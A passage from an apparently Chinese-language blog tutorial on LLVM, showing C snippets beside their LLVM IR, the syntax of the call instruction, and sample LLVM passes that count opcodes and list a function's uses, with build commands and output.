%<span class="number">2</span>, i64 <span class="number">0</span>, i64 <span class="number">4</span></span><br><span class="line">%<span class="number">6</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">5</span>, i64 <span class="number">0</span>, i64 <span class="number">4</span></span><br><span class="line">store i8 <span class="number">98</span>, i8* %<span class="number">6</span>, align <span class="number">4</span></span><br><span class="line">%<span class="number">7</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">4</span></span><br><span class="line">%<span class="number">8</span> = load i8, i8* %<span class="number">7</span>, align <span class="number">4</span> <span class="comment">/* 取数据 */</span></span><br><span class="line">%<span class="number">9</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">store i8 %<span class="number">8</span>, i8* %<span class="number">9</span>, align <span class="number">16</span></span><br><span class="line">%<span class="number">10</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">5</span></span><br><span class="line">%<span class="number">11</span> = getelementptr inbounds [<span class="number">16</span> x i8*], [<span class="number">16</span> x i8*]* %<span class="number">3</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">store i8* %<span class="number">10</span>, i8** %<span class="number">11</span>, align <span class="number">16</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>name</code> 和 <code>&amp;name[0]</code> 是等价的</li>
<li>对于多级数组，需要分多次进行表示</li>
</ul>
<p>案例：结构体处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RT</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>* a;</span><br><span class="line">	<span class="keyword">int</span> b[<span class="number">10</span>][<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">char</span> c[<span class="number">5</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ST</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">double</span> y;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">RT</span> <span class="title">r</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">RT</span> <span class="title">rt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ST</span> <span class="title">st</span>;</span></span><br><span class="line">	st.r = rt;</span><br><span class="line">	st.x = <span class="number">1</span>;</span><br><span class="line">	st.y = <span class="number">2.0</span>;</span><br><span class="line">	rt.a = &amp;rt.c[<span class="number">3</span>];</span><br><span class="line">	rt.b[<span class="number">0x5</span>][<span class="number">0x5</span>] = <span class="number">4</span>;</span><br><span class="line">	rt.c[<span class="number">3</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span> = alloca %struct.RT, align <span class="number">8</span></span><br><span class="line">%<span class="number">2</span> = alloca %struct.ST, align <span class="number">8</span></span><br><span class="line">%<span class="number">3</span> = getelementptr inbounds %struct.ST, %struct.ST* %<span class="number">2</span>, i32 <span class="number">0</span>, i32 <span class="number">2</span></span><br><span class="line">%<span class="number">4</span> = bitcast %struct.RT* %<span class="number">3</span> to i8*</span><br><span class="line">%<span class="number">5</span> = bitcast %struct.RT* %<span class="number">1</span> to i8*</span><br><span class="line">call <span class="keyword">void</span> @llvm.<span class="built_in">memcpy</span>.p0i8.p0i8.i64(i8* align <span class="number">8</span> %<span class="number">4</span>, i8* align <span class="number">8</span> %<span class="number">5</span>, i64 <span class="number">816</span>, i1 <span class="literal">false</span>)</span><br><span class="line">%<span class="number">6</span> = getelementptr inbounds %struct.ST, %struct.ST* %<span class="number">2</span>, i32 <span class="number">0</span>, i32 <span class="number">0</span></span><br><span class="line">store i32 <span class="number">1</span>, i32* %<span class="number">6</span>, align <span class="number">8</span></span><br><span class="line">%<span class="number">7</span> = getelementptr inbounds %struct.ST, %struct.ST* %<span class="number">2</span>, i32 <span class="number">0</span>, i32 <span class="number">1</span></span><br><span class="line">store <span class="keyword">double</span> <span class="number">2.000000e+00</span>, <span class="keyword">double</span>* %<span class="number">7</span>, align <span class="number">8</span></span><br><span class="line">    <span class="comment">/* rt.c */</span></span><br><span class="line">%<span class="number">8</span> = getelementptr inbounds %struct.RT, %struct.RT* %<span class="number">1</span>, i32 <span class="number">0</span>, i32 <span class="number">2</span></span><br><span class="line">    <span class="comment">/* &amp;c[3] */</span></span><br><span class="line">%<span class="number">9</span> = getelementptr inbounds [<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* %<span class="number">8</span>, i64 <span class="number">0</span>, i64 <span class="number">3</span></span><br><span class="line">    <span class="comment">/* rt.a */</span></span><br><span class="line">%<span class="number">10</span> = getelementptr inbounds %struct.RT, %struct.RT* %<span class="number">1</span>, i32 <span class="number">0</span>, i32 <span class="number">0</span></span><br><span class="line">store i8* %<span class="number">9</span>, i8** %<span class="number">10</span>, align <span class="number">8</span></span><br><span class="line">    <span class="comment">/* rt.b */</span></span><br><span class="line">%<span class="number">11</span> = getelementptr inbounds %struct.RT, %struct.RT* %<span class="number">1</span>, i32 <span class="number">0</span>, i32 <span class="number">1</span></span><br><span class="line">%<span class="number">12</span> = getelementptr inbounds [<span class="number">10</span> x [<span class="number">20</span> x i32]], [<span class="number">10</span> x [<span class="number">20</span> x i32]]* %<span class="number">11</span>, i64 <span class="number">0</span>, i64 <span class="number">5</span></span><br><span class="line">%<span class="number">13</span> = getelementptr inbounds [<span class="number">20</span> x i32], [<span class="number">20</span> x i32]* %<span class="number">12</span>, i64 <span class="number">0</span>, i64 <span class="number">5</span></span><br><span class="line">store i32 <span class="number">4</span>, i32* %<span class="number">13</span>, align <span class="number">4</span></span><br><span class="line">    <span class="comment">/* rt.c */</span></span><br><span class="line">%<span class="number">14</span> = getelementptr inbounds %struct.RT, %struct.RT* %<span class="number">1</span>, i32 <span class="number">0</span>, i32 <span class="number">2</span></span><br><span class="line">%<span class="number">15</span> = getelementptr inbounds [<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* %<span class="number">14</span>, i64 <span class="number">0</span>, i64 <span class="number">3</span></span><br><span class="line">store i8 <span class="number">99</span>, i8* %<span class="number">15</span>, align <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>数组中的索引在结构体中依然适用</li>
<li>在使用结构体之前，需要先找到对应的结构体条目</li>
</ul>
<p>Call 指令用于调用一个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = [tail | musttail | notail ] call [fast-math flags] [cconv] [ret attrs] [addrspace(&lt;num&gt;)]&lt;ty&gt;|&lt;fnty&gt; &lt;fnptrval&gt;(&lt;function args&gt;) [fn attrs] [ operand bundles ]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>tail 和 musttail 标记指示优化器应执行尾(tail)调用优化，notail 标记表示优化器不应该向调用添加 tail 或 musttail 标记，它用于防止对调用执行尾调用优化<ul>
<li>tail 标记是可以忽略的提示</li>
<li>musttail 标记意味着该调用必须经过尾(tail)调用优化，以使程序正确</li>
<li>musttail 标记提供以下保证：<ul>
<li>如果该调用是调用图中的递归循环的一部分，则该调用将不会导致堆栈无限增长</li>
<li>具有 inalloca 或 preallocated 属性的参数将就地转发</li>
<li>如果 musttail 调用出现在带有 thunk 属性的函数中，并且调用者和被调用者都具有可变参数，那么寄存器或内存中的任何非原型参数都将转发给被调用者，类似地，被调用者的返回值返回给调用者的调用者，即使使用了空返回类型</li>
</ul>
</li>
</ul>
</li>
<li>fast-math flags 标记表示调用有一个或多个 fast-math flags (高级结构里面有这个的介绍)，这些 fast-math flags 是用于启用不安全的浮点优化的优化提示，fast-math flags 仅对返回浮点标量或向量类型、浮点标量或向量数组(嵌套到任何深度)类型的调用有效</li>
<li>cconv 标记指示调用应该使用哪种调用约定(高级结构里面有调用约定的介绍)，如果没有指定，调用默认使用C调用约定，该调用约定必须匹配目标函数的调用约定，否则行为是未定义的</li>
<li>ret attrs 列出返回值的参数属性(高级结构里面有参数属性的介绍)，这里只有 zeroext、signext 和 inreg 属性有效 addrspace(<code>&lt;num&gt;</code>) 属性可用于指示被调用函数的地址空间，如果未指定，将使用 data layout (高级结构里面有这个的介绍，翻译成了数据布局)字符串中的程序地址空间</li>
<li><code>&lt;ty&gt;</code> 是调用指令本身的类型，也是返回值的类型，没有返回值的函数被标记为 void</li>
<li><code>&lt;fnty&gt;</code> 是被调用函数的签名，参数类型必须匹配此签名所隐含的类型，如果函数不是可变参数，则可以省略此类型</li>
<li>fnptrval 是一个 LLVM 值，包含要调用的函数的指针（定义一个函数时的函数名），在大多数情况下，这是一个直接的函数调用，但是间接调用则尽可能调用任意指向函数值的指针</li>
<li>function args 是函数参数列表，有参数类型和参数属性，所有的参数都是 first class type，如果函数签名表明函数接受可变数量的参数，则可以指定额外的参数</li>
<li>fn attrs 函数属性</li>
<li>operand bundles 操作数集</li>
</ul>
<p>案例：函数调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">	read(<span class="number">0</span>,name,<span class="number">0x10</span>);</span><br><span class="line">	write(<span class="number">1</span>,name,<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span> = alloca [<span class="number">16</span> x i8], align <span class="number">16</span></span><br><span class="line">%<span class="number">2</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">%<span class="number">3</span> = call i64 @read(i32 <span class="number">0</span>, i8* %<span class="number">2</span>, i64 <span class="number">16</span>)</span><br><span class="line">%<span class="number">4</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">%<span class="number">5</span> = call i64 @write(i32 <span class="number">1</span>, i8* %<span class="number">4</span>, i64 <span class="number">16</span>)</span><br><span class="line">%<span class="number">6</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* @.str, i64 <span class="number">0</span>, i64 <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<h2 id="LLVM-PASS"><a href="#LLVM-PASS" class="headerlink" title="LLVM PASS"></a>LLVM PASS</h2><p>LLVM 的优化和转换工作就是由多个 pass 来一起完成的，类似流水线操作一样，每个 pass 完成特定的优化工作，所有的 pass 大致可以分为两类：</p>
<ul>
<li>分析 (<code>analysis</code>) 和转换分析类的 pass 以提供信息为主</li>
<li>转换类 (<code>transform</code>) 的 pass 优化中间代码</li>
</ul>
<p>LLVM 分三个阶段，对于不同的语言它都提供了同一种中间表示： </p>
<ul>
<li>前端可以使用不同的编译工具对代码文件做词法分析以形成抽象语法树（AST），然后将分析好的代码转换成 LLVM 的中间表示 IR（intermediate representation）</li>
<li>中间部分的优化器只对中间表示 IR 进行操作，通过一系列的 pass 对 IR 做优化</li>
<li>后端负责将优化好的 IR 解释成对应平台的机器码</li>
</ul>
<p>LLVM 的优点在于：中间表示 IR 代码编写良好，而且不同的前端语言最终都转换成同一种的 IR</p>
<ul>
<li>计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决</li>
</ul>
<p>所以 LLVM 就是在执行优化操作之前，先把代码转化为 LLVM 的中间表示 IR，然后对 IR 进行优化，最后交给后端翻译为机器码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm; <span class="comment">/* 使用的函数在llvm命名空间中 */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">/* 声明匿名空间,使得被声明的内容仅在该文件内部可见 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass <span class="comment">/* 使用struct声明,表示默认共有继承</span></span><br><span class="line"><span class="comment">  FunctionPass 一次操作一个函数 */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ID; <span class="comment">/* 声明了LLVM用于标识传递的传递标识符,这允许LLVM避免使用昂贵的C++运行时信息 */</span></span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125; <span class="comment">/* 构造函数,调用父函数FunctionPass的构造函数进行初始化 */</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> <span class="comment">/* 重写runOnFunction入口函数 */</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      std::map&lt;std::string, <span class="keyword">int</span>&gt; opCodeMap;</span><br><span class="line">      <span class="keyword">int</span> BBsize=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> opsize=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(Function::iterator bbit=F.<span class="built_in">begin</span>();bbit!=F.<span class="built_in">end</span>();bbit++)</span><br><span class="line">      &#123;</span><br><span class="line">        BBsize++;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock::iterator opit=bbit-&gt;<span class="built_in">begin</span>();opit!=bbit-&gt;<span class="built_in">end</span>();opit++)</span><br><span class="line">        &#123;</span><br><span class="line">          opsize++;</span><br><span class="line">          <span class="function">std::string <span class="title">opName</span><span class="params">(opit-&gt;getOpcodeName())</span></span>;</span><br><span class="line">          std::map&lt;std::string,<span class="keyword">int</span>&gt;::iterator itindex=opCodeMap.<span class="built_in">find</span>(opName);</span><br><span class="line">          <span class="keyword">if</span>(itindex!=opCodeMap.<span class="built_in">end</span>())opCodeMap[opName]++;</span><br><span class="line">          <span class="keyword">else</span> opCodeMap[opName]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>())&lt;&lt;<span class="string">&quot; has &quot;</span>&lt;&lt;BBsize&lt;&lt;<span class="string">&quot;  BasicBlocks   and &quot;</span>&lt;&lt;opsize&lt;&lt;<span class="string">&quot;   opcode&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">auto</span> it : opCodeMap)<span class="built_in">errs</span>() &lt;&lt;<span class="string">&quot;   function totally use  &quot;</span>&lt;&lt;it.first &lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;it.second &lt;&lt;<span class="string">&quot;times \n&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>; <span class="comment">/* 初始化pass ID(LLVM使用ID的地址来识别通行证) */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,<span class="literal">false</span>)</span></span>; </span><br><span class="line"><span class="comment">/* 注册类Hello,给它命令行参数hello,和名字Hello World Pass</span></span><br><span class="line"><span class="comment">最后两个参数描述它的行为:</span></span><br><span class="line"><span class="comment">如果一个pass在没有修改它的情况下遍历CFG,那么第三个参数设置为true</span></span><br><span class="line"><span class="comment">如果传递是分析传递(例如:支配树传递),则true作为第四个参数提供 */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>编译代码为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure>
<h2 id="LLVM-Value"><a href="#LLVM-Value" class="headerlink" title="LLVM Value"></a>LLVM Value</h2><p>在 LLVM 中，Value 类是所有程序计算出的值的类（如：Arguments，Instructions， Functions 等）的基类，Value类的继承树如下： </p>
<img src="/2023/03/24/LLVM%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/931acba538dc4b96863d7e1eec350d28.png" class title="931acba538dc4b96863d7e1eec350d28"> 
<p>在 LLVM 中一切皆 Value：</p>
<ul>
<li>Value 类是 LLVM 中非常重要的基类</li>
<li>输入程序流中的 “变量/常量/表达式/符号” 都可以被视作一个 Value</li>
</ul>
<p>Value 类包含多个成员，这里先介绍最重要的三个成员：VTy，UseList，SubclassID</p>
<ul>
<li>VTy：<ul>
<li>一个 Value 必然具有一个类型 Type</li>
<li>VTy 用来记录这个 Value 的Type</li>
</ul>
</li>
<li>UseList：<ul>
<li>LLVM 引入了 Use 类并在 Value 中添加一个 UseList 用来跟踪并记录 Value 的使用者</li>
<li>虽然名为 UseList 但只是一个 Use 类的指针</li>
</ul>
</li>
<li>SubclassID：<ul>
<li>这是一个 const 值，用来指示这个 Value 的子类型</li>
<li>其用于 <code>isa&lt;&gt;</code> 与 <code>dyn_cast&lt;&gt;</code> 的判断</li>
</ul>
</li>
</ul>
<p>1个具体的值，在IR中可能会被多处引用（比如：函数的入参会被函数中的多条指令引用）</p>
<p>在 Value 类中保存了一个 Users 列表（UseList）跟踪这种引用关系，这个被称为 def-use chain，可以使用如下的方法获取 Value 的 Uses：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Value::use_iterator <span class="comment">// use-list的迭代器</span></span><br><span class="line">Value::const_use_iterator <span class="comment">// use-list的只读迭代器</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">use_size</span><span class="params">()</span> <span class="comment">// 返回value的引用次数</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">use_empty</span><span class="params">()</span> <span class="comment">// 如果use-list为NULL则返回true</span></span></span><br><span class="line"><span class="function">use_iterator <span class="title">use_begin</span><span class="params">()</span> <span class="comment">// 获取迭代器的开头</span></span></span><br><span class="line"><span class="function">use_iterator <span class="title">use_end</span><span class="params">()</span> <span class="comment">// 获取迭代器的末端</span></span></span><br><span class="line"><span class="function">User *<span class="title">use_back</span><span class="params">()</span> <span class="comment">// 获取use-list的最后一个元素</span></span></span><br></pre></td></tr></table></figure>
<p>使用案例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;Fun)</span> <span class="keyword">override</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;============[start]============&gt;&gt;\n&quot;</span>;</span><br><span class="line">    Function *F = &amp;Fun;</span><br><span class="line">    <span class="keyword">for</span> (Value::use_iterator U = F-&gt;<span class="built_in">use_begin</span>(), e = F-&gt;<span class="built_in">use_end</span>(); U != e; ++U) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Instruction *Inst = dyn_cast&lt;Instruction&gt;(&amp;*(U-&gt;<span class="built_in">getUser</span>()))) &#123;</span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;F is used in instruction:\n&quot;</span>;</span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; *Inst &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;=============[end]=============&gt;&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fun1();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun3</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fun1();</span><br><span class="line">	fun2();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun4</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fun1();</span><br><span class="line">	fun2();</span><br><span class="line">	fun3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fun1();</span><br><span class="line">	fun2();</span><br><span class="line">	fun3();</span><br><span class="line">	fun4();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">============[start]============&gt;&gt; <span class="comment">/* fun1的调用者 */</span></span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun1() <span class="comment">/* fun2中调用fun1 */</span></span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun1() <span class="comment">/* fun3中调用fun1 */</span></span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun1() <span class="comment">/* fun4中调用fun1 */</span></span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun1() <span class="comment">/* main中调用fun1 */</span></span><br><span class="line">=============[end]=============&gt;&gt;</span><br><span class="line">============[start]============&gt;&gt;</span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun2()</span><br><span class="line">F is used in 